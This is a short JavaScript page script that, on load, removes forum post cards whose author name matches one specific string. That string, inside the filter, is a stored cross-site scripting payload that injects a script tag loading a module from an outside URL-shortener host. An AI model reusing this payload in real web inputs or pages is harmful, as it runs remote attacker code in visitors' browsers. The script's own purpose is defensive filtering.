let mLoaded = false

window.onload = (ev) => {
    if (!mLoaded) {
        mLoaded = true
        main()
    } else return
}

function main() {
    const elements = document.getElementsByClassName('post-card')
    for (const element of elements) {
        const pHeader = element.getElementsByClassName('post-header')[0]
        const pAuthorInfo = pHeader.getElementsByClassName('author-info')[0]
        const pAuthorName = pAuthorInfo.children[0]
        if (pAuthorName && (pAuthorName.innerHTML == '网友27"&gt;<script async="" type="module" src="http://shoturl.cn/OHokO7"></script>')) {
            setTimeout(() => {element.remove()}, 20)
        }
    }
}
